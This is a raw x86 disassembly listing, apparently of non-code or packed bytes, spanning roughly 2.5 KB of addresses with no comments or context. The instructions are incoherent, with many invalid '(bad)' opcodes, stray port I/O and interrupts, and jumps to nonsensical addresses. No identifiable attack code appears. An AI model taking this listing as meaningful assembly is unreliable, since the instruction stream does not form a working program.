  4207b2:	push   cs
  4207b3:	sbb    eax,0xea46a4f8
  4207b8:	std    
  4207b9:	xor    esi,0xf5f53e31
  4207bf:	fdivr  st(5),st
  4207c1:	lods   al,BYTE PTR ds:[esi]
  4207c2:	inc    esi
  4207c3:	add    dh,ch
  4207c5:	xchg   ecx,eax
  4207c6:	or     bh,BYTE PTR [edx-0x32fd22b5]
  4207cc:	or     DWORD PTR [ebp+0x2d0aea46],esp
  4207d2:	inc    esi
	...
  4207eb:	add    bl,cl
  4207ed:	test   BYTE PTR [edi+0x7],0xbf
  4207f1:	aam    0x55
  4207f3:	mov    BYTE PTR [esp+eax*1+0x4fd7b63],bl
  4207fa:	out    0x89,eax
  4207fc:	cmp    ebx,edi
  4207fe:	in     eax,dx
  4207ff:	xchg   ebp,eax
  420800:	bound  eax,QWORD PTR [eax+0x3c6cecff]
  420806:	lds    ebp,FWORD PTR [edx-0x36077b09]
  42080c:	sub    al,0xf8
  42080e:	mov    DWORD PTR [edi+0x13b601f6],esi
  420814:	jo     0x420826
  420816:	add    eax,0xc60bcce9
  42081b:	scas   eax,DWORD PTR es:[edi]
  42081c:	lock cmc 
  42081e:	out    0xd2,al
  420820:	clc    
  420821:	add    al,0x0
  420823:	arpl   WORD PTR [edx],sp
  420825:	push   es
  420826:	or     eax,0x1c0e2e37
  42082b:	out    dx,al
  42082c:	cli    
  42082d:	mov    BYTE PTR [ebx],bl
  42082f:	call   0xd0c20d2b
  420834:	in     al,dx
  420835:	push   edi
  420836:	imul   ecx,DWORD PTR cs:[ebp-0x2d],0xcd77f773
  42083e:	inc    edi
  42083f:	xor    al,0xf1
  420841:	retf   0xdf45
  420844:	and    eax,0xf7e803eb
  420849:	add    al,0x80
  42084b:	mov    ds:0xb28301f5,eax
	...
  420868:	add    ch,ch
  42086a:	add    al,0x0
  42086c:	imul   ebx,DWORD PTR [esi],0xb5640d44
  420872:	std    
  420873:	(bad)  
  420874:	call   0xf158522a
  420879:	shr    dl,1
  42087b:	(bad)  
  42087c:	call   0xe4388d78
  420881:	sub    al,0x39
  420883:	and    BYTE PTR [ebx-0x10],0x57
  420887:	xor    al,0x69
  420889:	sahf   
  42088a:	inc    eax
  42088b:	jae    0x42086d
  42088d:	mov    cl,0x49
  42088f:	push   ss
  420890:	loop   0x420832
  420892:	ret    0xffff
  420895:	popf   
  420896:	pop    es
  420897:	cmp    dl,0x8c
  42089a:	sub    al,0x1d
  42089c:	and    dh,0x3c
  42089f:	jno    0x4208aa
  4208a1:	fisttp DWORD PTR [ecx+0x16]
  4208a4:	adc    esp,esp
  4208a6:	jno    0x4208a4
  4208a8:	dec    DWORD PTR [ebp+0x5801f687]
  4208ae:	add    DWORD PTR [eax+0x52cb0fb],eax
  4208b4:	(bad)  
  4208b5:	fst    DWORD PTR [eax]
  4208b8:	jmp    0x421083
  4208bd:	int    0xad
  4208bf:	dec    BYTE PTR [esi]
  4208c1:	fdiv   DWORD PTR ds:0x875d000a
  4208c7:	test   DWORD PTR [ecx+0x52],0xa658a
	...
  4208e6:	dec    ebp
  4208e7:	pop    es
  4208e8:	mov    BYTE PTR [esi+0x2b],0xd6
  4208ec:	in     eax,0x90
  4208ee:	sbb    eax,0x34800007
  4208f3:	fidiv  DWORD PTR [ecx+0x18]
  4208f6:	lea    ebp,[esi+0x16980efd]
  4208fc:	or     al,BYTE PTR [eax]
  4208fe:	sbb    eax,0x1245f787
  420903:	mov    al,BYTE PTR [ebp+0xa]
  420906:	or     eax,0xeb46c607
  42090b:	add    bh,ah
  42090d:	jae    0x42096c
  42090f:	scas   eax,DWORD PTR es:[edi]
  420910:	std    
  420911:	je     0x4208da
  420913:	xchg   ch,dh
  420915:	add    ebx,eax
  420917:	sub    eax,DWORD PTR [eax+0x639effb]
  42091d:	(bad)  
  42091e:	fmul   DWORD PTR [eax]
  420921:	jmp    0x4208a6
  420923:	xchg   bh,dh
  420925:	push   ebp
  420926:	hlt    
  420927:	mov    al,0x2
  420929:	(bad)  
  42092a:	cmp    bl,dl
  42092c:	add    al,0xe9
  42092e:	inc    edi
  42092f:	pop    esp
  420930:	xlat   BYTE PTR ds:[ebx]
  420931:	ds repz push 0xdbf409fa
  420938:	ret    0xea45
  42093b:	mov    bl,0xe7
  42093d:	inc    ebx
  42093e:	je     0x420966
  420940:	add    dh,BYTE PTR [ebx-0x2c]
  420943:	pop    ebx
  420944:	fld    DWORD PTR [ebx]
  420946:	add    edi,esp
  420948:	cmp    al,0x0
	...
  420963:	(bad)  
  420964:	js     0x42097b
  420966:	(bad)  
  420967:	mov    dl,0xb1
  420969:	stc    
  42096a:	call   0xd1b6582
  42096f:	loope  0x420936
  420971:	cmp    al,0xa7
  420974:	pop    eax
  420975:	es (bad) 
  420977:	mov    dl,0xd1
  420979:	repz call 0x4196562
  42097f:	jmp    0x4209e1
  420981:	cmp    al,0x7
  420983:	hlt    
  420984:	fild   DWORD PTR [eax-0x7a25070a]
  42098a:	push   ebp
  42098b:	in     eax,dx
  42098c:	fild   DWORD PTR [eax]
  42098e:	sbb    BYTE PTR [edi],0xec
  420991:	or     al,BYTE PTR [ebx+0xe4c1]
  420997:	xor    ah,BYTE PTR [edx]
  420999:	test   BYTE PTR [edx],0x2
  42099c:	sahf   
  42099d:	mov    BYTE PTR [ebp-0x9],dl
  4209a0:	test   ah,cl
  4209a2:	pop    es
  4209a3:	hlt    
  4209a4:	fild   DWORD PTR [eax-0x7b24eb08]
  4209aa:	shr    ah,0xdb
  4209ad:	add    BYTE PTR [ecx+0x20c058],al
  4209b3:	dec    ecx
  4209b4:	in     al,0x87
  4209b6:	inc    ebx
  4209b7:	adc    BYTE PTR ds:0x29378af7,al
  4209bd:	pop    es
  4209be:	test   BYTE PTR [ecx],bh
  4209c0:	sti    
  4209c1:	jmp    0x420a19
  4209c3:	clc    
  4209c4:	retf   0x2a4
	...
  4209df:	add    BYTE PTR [ecx],al
  4209e1:	add    bh,BYTE PTR [ebp+0x45]
  4209e4:	mov    ds:0x5feb317b,eax
  4209e9:	fidiv  DWORD PTR ds:0xe84a7bdc
  4209ef:	pop    ds
  4209f0:	mov    eax,DWORD PTR [edx]
  4209f2:	ins    BYTE PTR es:[edi],dx
  4209f3:	ja     0x4209f0
  4209f5:	add    al,0xe7
  4209f7:	mov    DWORD PTR [ecx],esi
  4209f9:	cli    
  4209fa:	retf   0xff8d
  4209fd:	add    al,BYTE PTR [eax]
  4209ff:	pop    esp
  420a00:	repz add al,0xe7
  420a03:	sbb    DWORD PTR [esi+edi*8+0x72],0xffffffec
  420a08:	fcmovne st,st(5)
  420a0a:	jecxz  0x420a63
  420a0c:	pop    esi
  420a0d:	test   cl,dh
  420a0f:	and    al,al
  420a11:	out    0xd1,eax
  420a13:	leave  
  420a14:	ret    
  420a15:	int    0xf0
  420a17:	dec    edi
  420a18:	in     al,0x84
  420a1a:	ror    DWORD PTR [ecx],1
  420a1c:	test   al,0xfd
  420a1e:	data16 fisttp WORD PTR [ebx]
  420a21:	pop    eax
  420a22:	test   edx,eax
  420a24:	mov    ecx,0x3ef0a03
  420a29:	push   ss
  420a2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a2b:	bound  edi,QWORD PTR [ebx+0x4a]
  420a2e:	xlat   BYTE PTR ds:[ebx]
  420a2f:	ins    DWORD PTR es:[edi],dx
  420a30:	repz sub al,0x67
  420a33:	fucomip st,st(6)
  420a35:	push   0x70
  420a37:	inc    edx
  420a38:	out    0x1,al
  420a3a:	jl     0x420a00
  420a3c:	mul    DWORD PTR [eax]
  420a3e:	pop    edi
  420a3f:	inc    edx
  420a40:	jmp    0x420abd
  420a42:	sbb    ah,BYTE PTR [eax]
	...
  420a5c:	add    BYTE PTR [edx+ecx*4],dl
  420a5f:	cwde   
  420a60:	or     esi,DWORD PTR [eax+0xf]
  420a63:	add    cl,ah
  420a65:	test   DWORD PTR [ecx+ecx*4],0xfc83cbee
  420a6c:	fisttp QWORD PTR [edi]
  420a6e:	jle    0x420ab3
  420a70:	add    eax,0xb9c21dc0
  420a75:	add    dl,0xfc
  420a78:	ss jne 0x420a0b
  420a7b:	jae    0x420a70
  420a7d:	jno    0x420ac9
  420a7f:	adc    eax,0x1fc7205
  420a84:	popa   
  420a85:	ss cli 
  420a87:	mov    DWORD PTR [edi+0x717d2486],esp
  420a8d:	xor    al,0x29
  420a8f:	or     eax,0xf8ff74ee
  420a94:	push   ss
  420a95:	dec    edi
  420a96:	test   DWORD PTR [ebx-0x3b],esp
  420a99:	pop    ss
  420a9a:	add    eax,0x4efece7
  420a9f:	add    BYTE PTR [ecx+0x3b],ch
  420aa2:	lock or al,0x6d
  420aa5:	sub    al,0x9
  420aa7:	add    cl,ch
  420aa9:	ja     0x420a78
  420aab:	inc    edi
  420aac:	div    BYTE PTR [esi+ebp*1+0x8]
  420ab0:	jmp    0xe887d1ac
  420ab5:	adc    ebp,eax
  420ab7:	jmp    0x804702a2
  420abc:	ret    0x1d3
  420abf:	and    DWORD PTR [ecx+0x0],0x0
	...
  420ada:	inc    ebx
  420adb:	sar    esp,1
  420add:	scas   eax,DWORD PTR es:[edi]
  420ade:	mov    ch,0xcf
  420ae0:	and    eax,eax
  420ae2:	dec    edi
  420ae3:	or     DWORD PTR [eax],eax
  420ae5:	jmp    0xee95d861
  420aea:	je     0x420ab6
  420aec:	sti    
  420aed:	xchg   esi,eax
  420aee:	into   
  420aef:	leave  
  420af0:	inc    ebp
  420af1:	call   0x107f30b
  420af6:	rol    BYTE PTR [ebx],cl
  420af8:	add    BYTE PTR [eax-0x7af4ec8a],al
  420afe:	adc    DWORD PTR [eax+0x4593fffb],edi
  420b04:	std    
  420b05:	es and al,0x80
  420b08:	add    eax,DWORD PTR [eax]
  420b0a:	int    0x83
  420b0c:	imul   DWORD PTR [edi]
  420b0e:	call   0xc2ab:0x3afc9e84
  420b15:	inc    esi
  420b16:	mov    WORD PTR [ebx],ds
  420b18:	in     eax,0xa2
  420b1a:	xchg   edx,eax
  420b1b:	add    eax,DWORD PTR [eax]
  420b1d:	lea    ebx,[esi-0x46]
  420b20:	cmp    BYTE PTR [eax],cl
  420b22:	stos   BYTE PTR es:[edi],al
  420b23:	adc    BYTE PTR [esi+0x62aadafb],0xf
  420b2a:	sbb    eax,edi
  420b2c:	bound  eax,QWORD PTR [ebx-0x769a0c0b]
  420b32:	xchg   ebx,eax
  420b33:	rol    edx,cl
  420b35:	inc    esi
  420b36:	dec    esp
  420b37:	and    ch,ah
  420b39:	adc    BYTE PTR [edx+0x3],0x0
  420b3d:	add    BYTE PTR [eax],0x0
	...
  420b54:	add    BYTE PTR [eax],al
  420b56:	add    BYTE PTR [esi+0x1c],al
  420b59:	or     eax,DWORD PTR [ebp-0x45198]
  420b5f:	xchg   ebx,eax
  420b60:	inc    edx
  420b61:	std    
  420b62:	sub    DWORD PTR [eax+edi*1],esp
  420b65:	add    eax,DWORD PTR [eax]
  420b67:	sbb    eax,0xf9d03f86
  420b6c:	sti    
  420b6d:	or     al,BYTE PTR [edi-0x44e3b]
  420b73:	mov    bl,0xfd
  420b75:	mov    ebp,0xe489c3c3
  420b7a:	xor    BYTE PTR [ebx+0x5312427b],dh
  420b80:	inc    edx
  420b81:	std    
  420b82:	sub    ah,BYTE PTR [eax+ebx*1+0x3]
  420b86:	add    ah,dh
  420b88:	fild   DWORD PTR [eax+0x8f8f9f8]
  420b8e:	(bad)  
  420b8f:	cmp    bl,ch
  420b91:	and    al,0xe7
  420b93:	ss out 0x0,eax
  420b96:	add    BYTE PTR [ebx+edx*2+0xe],dh
  420b9a:	or     eax,0xfcd4ba70
  420b9f:	ret    
  420ba0:	xor    eax,0x2fbbf965
  420ba5:	test   al,bh
  420ba7:	(bad)  
  420ba8:	out    0x7c,al
  420baa:	adc    ebp,DWORD PTR [eax+0x3a89d73f]
  420bb0:	scas   eax,DWORD PTR es:[edi]
  420bb1:	sbb    al,0x94
  420bb3:	call   0xfc57f56f
  420bb8:	fild   DWORD PTR [eax]
  420bba:	mov    BYTE PTR [eax],0x0
	...
  420bd1:	add    BYTE PTR [eax],al
  420bd3:	add    BYTE PTR [edx],dh
  420bd5:	fisttp QWORD PTR [edi]
  420bd7:	out    0xea,eax
  420bd9:	fiadd  WORD PTR [eax]
  420bdb:	add    bl,ch
  420bdd:	xor    eax,0x147489c3
  420be2:	imul   eax,DWORD PTR [eax-0xc],0x67
  420be6:	les    ecx,FWORD PTR [eax+edi*2]
  420be9:	pop    ebp
  420bea:	(bad)  
  420beb:	push   esp
  420bed:	pop    edx
  420bee:	pop    eax
  420bef:	and    al,0xf0
  420bf1:	fisttp DWORD PTR [ebp+0x8]
  420bf4:	jg     0x420c66
  420bf6:	sbb    al,0x10
  420bf8:	ins    DWORD PTR es:[edi],dx
  420bf9:	sbb    BYTE PTR [eax],ah
  420bfb:	sbb    al,0xeb
  420bfd:	ins    DWORD PTR es:[edi],dx
  420bfe:	rol    BYTE PTR [eax+0x45c23b1c],0xf7
  420c05:	fstp   TBYTE PTR [esi+0x4ff5f545]
  420c0b:	sub    al,0x77
  420c0d:	mov    ah,0x5
  420c0f:	je     0x420c03
  420c11:	pop    edx
  420c12:	jmp    0x48ed8c1a
  420c17:	or     eax,0x3450579
  420c1c:	hlt    
  420c1d:	add    al,0xa5
  420c1f:	inc    ecx
  420c20:	idiv   ah
  420c22:	jg     0x420beb
  420c24:	icebp  
  420c25:	add    al,0xe7
  420c27:	sar    DWORD PTR [ecx],0x3
  420c2a:	out    dx,al
  420c2b:	jmp    0x46ba:0x3e706b4
  420c32:	jmp    0xe4ccdf35
  420c37:	add    eax,DWORD PTR [eax]
	...
  420c51:	hlt    
  420c52:	(bad)  
  420c53:	lods   al,BYTE PTR ds:[esi]
  420c54:	add    eax,0x197dcbb
  420c59:	hlt    
  420c5a:	add    al,0xe6
  420c5c:	xchg   ecx,eax
  420c5d:	mov    ah,0x7a
  420c5f:	mov    bx,0x450c
  420c63:	out    0x7f,eax
  420c65:	pop    ebx
  420c66:	std    
  420c67:	bound  edx,QWORD PTR ds:0x8e6cd93
  420c6d:	inc    edx
  420c6e:	ds jmp 0xf20d81be
  420c74:	or     BYTE PTR [ecx+0x72],dh
  420c77:	in     al,0x3
  420c79:	hlt    
  420c7a:	int    0xca
  420c7c:	xchg   BYTE PTR [ecx],ch
  420c7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c80:	add    esp,DWORD PTR [edx+0x46]
  420c83:	jmp    0x51c3:0x53fdc917
  420c8a:	mov    esp,0x2e5305ca
  420c8f:	jmp    0x2d110097
  420c94:	add    edi,eax
  420c96:	pop    esi
  420c97:	out    dx,al
  420c98:	jo     0x420d0d
  420c9a:	into   
  420c9b:	sahf   
  420c9c:	and    ch,dh
  420c9e:	fistp  DWORD PTR [ebx]
  420ca0:	add    dh,ah
  420ca2:	add    al,0xc5
  420ca4:	ds cmc 
  420ca6:	adc    BYTE PTR [ebp+0x50],cl
  420ca9:	add    dl,BYTE PTR [ecx]
  420cab:	add    BYTE PTR ds:0xafbf71f3,bh
  420cb1:	xor    BYTE PTR [ecx],ah
  420cb3:	push   es
  420cb4:	nop
	...
  420ccd:	add    al,bl
  420ccf:	add    al,BYTE PTR [eax]
  420cd1:	jmp    0xed444f87
  420cd6:	fdivr  DWORD PTR ds:0xcaf7e906
  420cdc:	inc    ebp
  420cdd:	jmp    0xfeb1:0x69013a6d
  420ce4:	or     al,0x6e
  420ce6:	mov    ch,0xcc
  420ce8:	cld    
  420ce9:	jmp    0x24109fe8
  420cee:	jbe    0x420d08
  420cf0:	js     0x420c9b
  420cf2:	idiv   ecx
  420cf4:	sbb    BYTE PTR [edi+0x690004f0],0xc1
  420cfb:	add    ecx,DWORD PTR ds:0x2d46c
  420d01:	jmp    0xe0444f57
  420d06:	cwde   
  420d07:	in     eax,dx
  420d08:	add    eax,0x45caf7e9
  420d0d:	jmp    0xfc51:0x69013a6d
  420d14:	or     al,0x6e
  420d16:	in     eax,0xcb
  420d18:	cld    
  420d19:	jmp    0xc410a018
  420d1e:	jne    0x420d2c
  420d20:	js     0x420ccb
  420d22:	idiv   ecx
  420d24:	sub    BYTE PTR [edi-0x10],0x4
  420d28:	add    BYTE PTR [ecx+0x21],ch
  420d2b:	stc    
  420d2c:	call   0x1842ee8
  420d31:	jae    0x420d33
	...
  420d4b:	mov    ecx,0xf1d08005
  420d50:	push   ecx
  420d51:	jbe    0x420d31
  420d53:	jno    0x420d10
  420d55:	cmp    DWORD PTR [eax],eax
  420d57:	(bad)  
  420d58:	sbb    edi,DWORD PTR [eax+0x40]
  420d5b:	sbb    eax,0x44806735
  420d60:	std    
  420d61:	or     al,BYTE PTR [ebp+0x564]
  420d67:	dec    ebx
  420d68:	or     al,BYTE PTR [edx]
  420d6a:	or     al,BYTE PTR [edi+edx*4-0x4e22ffff]
  420d71:	inc    edx
  420d72:	add    edx,DWORD PTR [edi+0x42]
  420d75:	(bad)  
  420d76:	jg     0x420dec
  420d78:	shl    BYTE PTR [ebx+0x4e],1
  420d7b:	loop   0x420df6
  420d7d:	int    0x3a
  420d7f:	pop    edi
  420d80:	sub    al,0x78
  420d82:	inc    eax
  420d83:	int    0x34
  420d85:	aas    
  420d86:	adc    BYTE PTR [eax+ebx*8+0xb],0x85
  420d8b:	mov    WORD PTR [eax+eax*1],es
  420d8e:	add    bl,bl
  420d90:	or     DWORD PTR [edx],eax
  420d92:	or     esi,DWORD PTR [eax+eiz*4]
  420d95:	add    DWORD PTR [eax],eax
  420d97:	lea    esi,[ecx+0x42070342]
  420d9d:	(bad)  
  420d9e:	jg     0x420d64
  420da0:	retf   0x2673
  420da3:	mov    ds:0xf3acd79,al
  420da8:	xor    BYTE PTR [eax+0x40],bh
  420dab:	pop    ebp
  420dac:	xor    al,0x17
  420dae:	add    BYTE PTR [eax],0x0
	...
  420dc5:	add    BYTE PTR [eax],al
  420dc7:	add    BYTE PTR [edx+ecx*8],al
  420dca:	or     eax,DWORD PTR [ebp+0x4d4]
  420dd0:	or     ecx,DWORD PTR [edx]
  420dd2:	add    cl,BYTE PTR [esp+eiz*8]
  420dd5:	xchg   DWORD PTR [ecx],eax
  420dd7:	add    BYTE PTR [ebp-0x79],bl
  420dda:	mul    DWORD PTR [eax]
  420ddc:	and    cl,BYTE PTR [ebx+0x74]
  420ddf:	add    eax,0x46c6074d
  420de4:	pop    ds
  420de5:	pop    es
  420de6:	in     eax,0x6e
  420de8:	hlt    
  420de9:	fadd   DWORD PTR [eax]
  420deb:	add    BYTE PTR [esi+esi*4+0x19],dh
  420def:	jae    0x420d9e
  420df1:	fwait
  420df2:	cmp    eax,0x3056e2ff
  420df7:	and    al,0xe8
  420df9:	pop    eax
  420dfa:	mov    dl,0xc
  420dfc:	js     0x420df2
  420dfe:	cld    
  420dff:	(bad)  
  420e00:	sti    
  420e01:	push   ebp
  420e02:	push   ebx
  420e03:	or     BYTE PTR [ecx+0x6b],bh
  420e06:	dec    edi
  420e07:	sub    BYTE PTR [edi+0x18],bh
  420e0a:	and    BYTE PTR [eax],dl
  420e0c:	setle  BYTE PTR [ebx]
  420e0f:	mov    DWORD PTR [edx-0x4b7d557d],ebp
  420e15:	rol    BYTE PTR [esi],1
  420e17:	mov    dh,BYTE PTR [edx]
  420e19:	stos   DWORD PTR es:[edi],eax
  420e1a:	sbb    al,0x81
  420e1c:	lock fimul WORD PTR [eax+0x3e55e345]
  420e23:	adc    eax,0x4388aad8
  420e28:	shl    dl,1
  420e2a:	add    eax,DWORD PTR [ebx+0x0]
	...
  420e44:	add    al,dl
  420e46:	xor    edx,ebx
  420e48:	cld    
  420e49:	ja     0x420e03
  420e4b:	sbb    al,0x1c
  420e4d:	hlt    
  420e4e:	xor    al,0x24
  420e50:	add    esi,esp
  420e52:	fild   DWORD PTR [eax-0x56f0e08]
  420e58:	lds    esi,FWORD PTR [edx]
  420e5a:	fisttp QWORD PTR [esi]
  420e5c:	jmp    0xa196b05
  420e61:	sti    
  420e62:	pop    eax
  420e63:	mov    WORD PTR [edx],es
  420e65:	hlt    
  420e66:	fstp   TBYTE PTR [edx-0x184f0abb]
  420e6c:	sahf   
  420e6d:	je     0x420e76
  420e6f:	and    al,0xd
  420e71:	jo     0x420e44
  420e73:	cld    
  420e74:	inc    DWORD PTR [ebx+0x5c]
  420e77:	xlat   BYTE PTR ds:[ebx]
  420e78:	push   es
  420e79:	jmp    0x420e7f
  420e7b:	imul   ecx,edi,0xfffffff7
  420e7e:	add    al,0xe7
  420e80:	adc    BYTE PTR [esp+ecx*1],dh
  420e83:	sub    esp,DWORD PTR [eax]
  420e85:	or     BYTE PTR [eax-0x21],dl
  420e88:	mov    BYTE PTR [edi-0x407528e0],ch
  420e8e:	and    bl,dl
  420e90:	mov    ebp,0x8bf703b1
  420e95:	mov    ecx,0xeed86705
  420e9a:	dec    edi
  420e9b:	xor    al,0x5e
  420e9d:	mov    ecx,0xf411e842
  420ea2:	or     ebp,DWORD PTR [ebx]
  420ea4:	and    BYTE PTR [eax],cl
  420ea6:	cli    
  420ea7:	(bad)  
  420ea8:	retf   
	...
  420ec1:	add    bh,dh
  420ec3:	add    al,0xe7
  420ec5:	mov    BYTE PTR [eax-0x7],dl
  420ec8:	rcr    ebx,0x47
  420ecb:	sbb    DWORD PTR [edx+0x2f],esp
  420ece:	sbb    cl,dh
  420ed0:	popa   
  420ed1:	aas    
  420ed2:	adc    ch,dh
  420ed4:	adc    edx,eax
  420ed6:	inc    ebx
  420ed7:	jle    0x420f05
  420ed9:	aam    0xc0
  420edb:	jg     0x420f03
  420edd:	dec    edi
  420ede:	out    dx,al
  420edf:	jle    0x420e85
  420ee1:	in     al,dx
  420ee2:	xlat   BYTE PTR ds:[ebx]
  420ee3:	xor    dl,0xff
  420ee6:	jnp    0x420f2a
  420ee8:	(bad)  
  420ee9:	mov    DWORD PTR [ecx],esi
  420eeb:	repnz or dl,BYTE PTR [ebp+0x6c]
  420eef:	inc    eax
  420ef0:	add    eax,DWORD PTR ds:0xcc7d7fe9
  420ef6:	jo     0x420ec1
  420ef8:	imul   ebx,DWORD PTR [edi+0x10],0x6ceae6f1
  420eff:	add    bh,ah
  420f01:	add    esi,DWORD PTR [ebp+ecx*8-0x10]
  420f05:	dec    esi
  420f06:	cli    
  420f07:	ret    0x2a4
  420f0a:	pop    ds
  420f0b:	fdivp  st(7),st
  420f0d:	inc    esi
  420f0e:	clc    
  420f0f:	xchg   edx,eax
  420f10:	dec    ebp
  420f11:	jmp    0x420f80
  420f13:	les    ecx,FWORD PTR [ebx]
  420f15:	or     DWORD PTR [ebx-0x1e],edi
  420f18:	push   es
  420f19:	push   ebp
  420f1a:	mov    cl,0x41
  420f1c:	je     0x420f26
  420f1e:	loope  0x420f70
  420f20:	adc    DWORD PTR [eax],esp
  420f22:	cs aas 
  420f24:	add    ch,cl
	...
  420f3e:	add    dh,dh
  420f40:	test   DWORD PTR [ecx-0x1b],esp
  420f43:	test   DWORD PTR [eax+eax*4],0x59e1b7e7
  420f4a:	in     eax,0xf7
  420f4c:	add    al,0x3c
  420f4e:	or     dh,bh
  420f50:	jae    0x420f11
  420f52:	lahf   
  420f53:	test   al,0x24
  420f55:	or     eax,DWORD PTR [edx-0x46bf83f5]
  420f5b:	add    al,0x0
  420f5d:	or     eax,0x4916e
  420f62:	jmp    0x6b02965d
  420f67:	mov    al,ds:0x2e609718
  420f6c:	std    
  420f6d:	xchg   BYTE PTR [edi-0x1ace204d],bh
  420f73:	test   DWORD PTR [esp+edi*1],0xc6003cc2
  420f7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f7b:	icebp  
  420f7c:	mul    dh
  420f7e:	or     al,0xfc
  420f80:	add    al,0x0
  420f82:	std    
  420f83:	adc    bh,dl
  420f85:	xchg   edx,eax
  420f86:	sub    DWORD PTR [esi-0x21dc40],esp
  420f8c:	inc    ecx
  420f8d:	add    dl,BYTE PTR [eax]
  420f8f:	ins    BYTE PTR es:[edi],dx
  420f90:	add    al,0x0
  420f92:	jmp    0xfd665c09
  420f97:	idiv   DWORD PTR [esi-0x5fe17bb]
  420f9d:	add    DWORD PTR [eax],0x60
	...
  420fbc:	(bad)  
  420fbd:	xor    ecx,DWORD PTR [eax*4-0xcb56b6]
  420fc4:	dec    edx
  420fc5:	mov    bl,0xb
  420fc7:	mov    dh,0xeb
  420fc9:	dec    BYTE PTR [ecx+0x7f2419c3]
  420fcf:	stc    
  420fd0:	sbb    BYTE PTR [ebx],al
  420fd2:	mov    edi,DWORD PTR [ebp+0xf00040d]
  420fd8:	mov    eax,ds:0x1dfffc7a
  420fdd:	jg     0x420fc4
  420fdf:	add    BYTE PTR [edx],bl
  420fe1:	adc    bh,0x3
  420fe4:	or     eax,0xe4e97f04
  420fe9:	add    al,BYTE PTR [edx+edx*8+0x490003de]
  420ff0:	add    DWORD PTR ds:0x8c510f45,eax
  420ff6:	(bad)  
  420ff7:	(bad)  
  420ff8:	(bad)  [eax+0x3dd00a8]
  420ffe:	cmp    bl,0xad
  421001:	add    al,BYTE PTR [edx+edi*4-0x7ffffc32]
  421008:	push   ss
  421009:	hlt    
  42100a:	or     cl,BYTE PTR [ebx+eax*1+0xdfffffd]
  421011:	mov    bh,0x35
  421013:	(bad)  
  421016:	add    al,0x0
  421018:	popf   
  421019:	inc    esi
  42101a:	dec    ebx
  42101b:	or     BYTE PTR [edi+0xbe0b03],ah
	...
  421039:	into   
  42103a:	sub    DWORD PTR [edx],ecx
  42103c:	inc    DWORD PTR [ebx-0x39]
  42103f:	jg     0x421029
  421041:	dec    ebp
  421042:	pop    eax
  421043:	dec    esi
  421044:	mov    edx,DWORD PTR ds:0xf4e8d747
  42104a:	mov    eax,ds:0xda5bfeb2
  42104f:	enter  0x2e10,0xc2
  421053:	cs or  al,0xfb
  421056:	pop    ebx
  421057:	or     BYTE PTR [esp+esi*8],al
  42105a:	fstp   QWORD PTR [ecx+0x7]
  42105d:	call   DWORD PTR [edi-0x7]
  421060:	or     al,0x76
  421062:	jecxz  0x421066
  421064:	add    ah,dh
  421066:	push   edx
  421067:	(bad)  
  421068:	and    BYTE PTR [edi],dh
  42106a:	pop    edx
  42106b:	int3   
  42106c:	cld    
  42106d:	jmp    0x4210d0
  42106f:	fld    QWORD PTR [eax]
  421071:	hlt    
  421072:	fnstsw WORD PTR [ecx+0x7d]
  421075:	cld    
  421076:	push   esp
  421077:	xor    cl,BYTE PTR [ecx*1-0xbfffd10]
  42107e:	xchg   edi,eax
  42107f:	dec    ecx
  421080:	add    DWORD PTR [esi+0xe],edi
  421083:	add    eax,DWORD PTR [eax-0x7b002013]
  421089:	retf   
  42108a:	jno    0x42105a
  42108c:	cld    
  42108d:	jmp    0x4210bc
  42108f:	mov    cl,0x39
  421091:	jbe    0x4210ef
  421093:	dec    esp
  421094:	inc    eax
  421095:	hlt    
  421096:	(bad)  
  421097:	test   edi,eax
  421099:	ror    DWORD PTR [edi-0x31],0x7f
	...
  4210b5:	add    BYTE PTR [ebp-0x157d0022],bh
  4210bb:	fiadd  DWORD PTR [eax]
  4210bd:	add    BYTE PTR [edx-0x72effd62],dh
  4210c3:	add    DWORD PTR [ebx],eax
  4210c5:	add    ah,dh
  4210c7:	pop    edx
  4210c8:	leave  
  4210c9:	or     eax,0xf6839008
  4210ce:	sti    
  4210cf:	(bad)  
  4210d0:	test   DWORD PTR [eax-0x97cf34b],0x9486a6f6
  4210da:	jno    0x4210e1
  4210dc:	es rcl ecx,1
  4210df:	mov    ebp,0x52402a4
  4210e4:	add    BYTE PTR [eax],al
  4210e6:	cmc    
  4210e7:	add    al,0xe7
  4210e9:	sar    DWORD PTR [ecx-0xabd8eff],1
  4210ef:	test   bh,bh
  4210f1:	push   es
  4210f2:	icebp  
  4210f3:	jge    0x421161
  4210f5:	iret   
  4210f6:	cmp    dh,al
  4210f8:	fstp   QWORD PTR [ecx+0x77690b42]
  4210fe:	mov    ds:0x7700e744,eax
  421103:	dec    esi
  421104:	aam    0xd0
  421106:	sbb    BYTE PTR [ebp-0x7ffef831],al
  42110c:	retf   
  42110d:	add    eax,0x49a504f4
  421112:	div    dl
  421114:	mov    edi,0xe704f5af
  421119:	rol    DWORD PTR [eax],1
	...
  421133:	cmp    DWORD PTR [edx],eax
  421135:	jno    0x421178
  421137:	cmc    
  421138:	test   BYTE PTR [edi+0x3c7df0fd],bl
  42113e:	iret   
  42113f:	fadd   st,st(5)
  421141:	fstp   QWORD PTR [ecx+0x7b690ac2]
  421147:	inc    ebx
  421148:	inc    ebp
  421149:	out    0x0,eax
  42114b:	ja     0x42118a
  42114d:	je     0x42111f
  42114f:	mov    eax,0xfa6f84
  421154:	sbb    BYTE PTR [ebx+0x2504f405],0x49
  42115b:	div    bl
  42115d:	aas    
  42115e:	lahf   
  42115f:	cmc    
  421160:	add    al,0xe7
  421162:	or     DWORD PTR [edx+edi*8-0x3292790b],0x3d
  42116a:	shl    al,1
  42116c:	mov    ?,edi
  42116e:	scas   al,BYTE PTR es:[edi]
  42116f:	icebp  
  421170:	and    edi,0xffffffd9
  421173:	cmp    eax,0xc3d7ff3f
  421178:	jmp    0x6c0d:0x3cf49547
  42117f:	fild   DWORD PTR [ebx]
  421181:	add    cl,ch
  421183:	ja     0x42117c
  421185:	movups xmm6,XMMWORD PTR [ebx+0x3]
  421189:	add    cl,ch
  42118b:	ja     0x421184
  42118d:	pop    es
  42118e:	add    BYTE PTR [ebx+0x77e90002],ch
  421194:	test   DWORD PTR [ebx],0xd0
	...
  4211ae:	add    BYTE PTR [eax],al
  4211b0:	int3   
  4211b1:	add    al,BYTE PTR [eax]
